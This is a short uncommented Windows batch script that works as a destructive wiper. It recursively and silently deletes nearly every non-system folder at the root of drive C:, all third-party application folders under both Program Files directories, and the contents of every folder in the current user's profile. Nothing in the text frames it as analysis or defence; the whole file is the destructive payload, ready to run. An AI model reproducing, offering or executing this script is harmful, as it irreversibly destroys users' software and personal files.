c:
cd /
for /D %%I in (*) do if /I not "%%I"=="Windows" if /I not "%%I"=="Users" if /I not "%%I"=="Program Files (x86)" if /I not "%%I"=="Program Files" del /s /q "%%I"
cd C:/"Program Files (x86)"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft" if /I not "%%I"=="Microsoft.NET" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/"Program Files"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/Users/%username%
for /D %%A in (*) do (
    cd "%%A"
    del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
    cd ..
)
